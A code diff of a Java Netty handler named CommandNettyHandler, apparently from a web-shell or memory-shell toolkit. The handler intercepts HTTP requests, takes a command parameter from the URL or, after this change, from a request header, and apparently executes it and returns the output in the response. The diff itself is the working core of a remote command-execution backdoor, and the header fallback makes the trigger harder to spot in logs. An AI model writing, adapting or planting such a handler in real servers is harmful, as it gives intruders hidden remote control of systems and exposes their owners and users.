@@ -7,11 +7,10 @@ import io.netty.channel.ChannelHandler;
 import io.netty.channel.ChannelHandlerContext;
 import io.netty.handler.codec.http.*;
 
-import java.io.BufferedReader;
 import java.io.InputStream;
-import java.io.InputStreamReader;
 import java.net.URI;
 import java.nio.charset.StandardCharsets;
+import java.util.Scanner;
 
 /**
  * @author ReaJason
@@ -26,28 +25,26 @@ public class CommandNettyHandler extends ChannelDuplexHandler {
         if (msg instanceof HttpRequest) {
             HttpRequest request = (HttpRequest) msg;
             HttpHeaders headers = request.headers();
-            String param = getParam(getParamFromUrl(request.uri(), paramName));
-            if (param == null) {
+            String p = getParamFromUrl(request.uri(), paramName);
+            if (p == null || p.isEmpty()) {
+                p = headers.get(paramName);
+            }
+            if (p == null) {
                 ctx.fireChannelRead(msg);
                 return;
             }
-            StringBuilder result = new StringBuilder();
+            String result = "";
             try {
+                String param = getParam(p);
                 InputStream inputStream = getInputStream(param);
-                try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream))) {
-                    String line;
-                    while ((line = bufferedReader.readLine()) != null) {
-                        result.append(line);
-                        result.append(System.lineSeparator());
-                    }
-                }
+                result = new Scanner(inputStream).useDelimiter("\\A").next();
             } catch (Throwable e) {
                 e.printStackTrace();
             }
             send(ctx, result.toString());
-        } else {
-            ctx.fireChannelRead(msg);
+            return;
         }
+        ctx.fireChannelRead(msg);
     }
 
     private void send(ChannelHandlerContext ctx, String context) throws Exception {
